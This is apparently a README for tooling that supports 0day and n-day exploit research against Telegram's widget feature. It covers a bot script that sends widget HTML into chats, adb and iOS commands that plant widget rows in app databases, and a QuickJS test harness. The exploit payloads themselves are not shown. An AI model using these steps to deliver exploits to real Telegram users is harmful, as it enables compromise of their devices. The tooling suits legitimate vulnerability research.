# Common tools

Small host-side tools used by both the 0day and n-day material. They use the
Python standard library unless noted.

| Tool | What |
|---|---|
| `patch_android_widget_db.py` | Patch a `messageMediaWidget` payload in `cache4.db`. |
| `build_android_widget_db.py` | Create a widget message row in `cache4.db` from scratch. |
| `postbox_rewrite_widget.py` | Rewrite an iOS Postbox `t7` widget row, preserving key and lengths. |
| `list_ios_postbox_rows.py` | List widget rows in an iOS Postbox DB. |
| `quickjs-widget-harness.c` | The one-file 6 MiB QuickJS harness (one `JS_Eval`). |
| `quickjs-sibling-harness.c` | The sibling-script harness: one `JS_Eval` per `<script>`, continues after a throw. |

## Sender

The senders are in [`bot/`](../../../bot/).

```sh
export BOT_TOKEN='…'
python3 bot/send_widget.py \
  --html <widget.html> \
  --chat-id <chat id> \
  --allow-queries --background-query
```

- Beta endpoint: `https://api.telegram.org/beta/bot<TOKEN>/sendWidget`.
- Standard endpoint: `https://api.telegram.org/bot<TOKEN>/sendWidget` (served
  natively since 2026-11-08; `send_widget.py --api standard`).
- Raw ≤ 32,768 B; zlib9 ≤ 4,096 B.
- `--dry-run` checks the limits and prints the call.
- `--is-shared` requests a shared object; `--share-widget-id` +
  `--share-chat-id` place it in another chat with `sendSharedWidget`.
- The script never writes the token to disk.

## Android DB patch

```sh
adb pull /data/data/org.telegram.messenger.beta/files/cache4.db cache4.db
python3 docs/common/tools/patch_android_widget_db.py cache4.db <mid> --html <widget.html>
adb push cache4.db /data/data/org.telegram.messenger.beta/files/cache4.db
adb shell rm -f .../cache4.db-wal .../cache4.db-shm
```

Root is needed for the push. The exploit runs in the widget process: app UID on
72929 and earlier, isolated UID on 72979/72989.

## iOS Postbox

```sh
python3 docs/common/tools/list_ios_postbox_rows.py list db_sqlite
python3 docs/common/tools/postbox_rewrite_widget.py --db db_sqlite --list
python3 docs/common/tools/postbox_rewrite_widget.py \
  --db db_sqlite --ns 1 --message-id <row> \
  --html <widget.html> --out db_sqlite.new \
  --expect <marker> --preserve-length --pad-html
```

The rewrite preserves the `t7` key (message id) and, with
`--preserve-length --pad-html`, the length fields. A raw rewrite can trap the
Postbox decoder.

## Host harness

```sh
cc -O2 -I <quickjs-src> quickjs-widget-harness.c \
  <quickjs-src>/quickjs.c <quickjs-src>/libregexp.c <quickjs-src>/libunicode.c \
  <quickjs-src>/dtoa.c -lm -o /tmp/opencode/run6m
```

The harness sets a 6 MiB limit and evaluates one file. It has no host
functions, which matches the widget sandbox. See
`docs/common/07-methodology.md`.
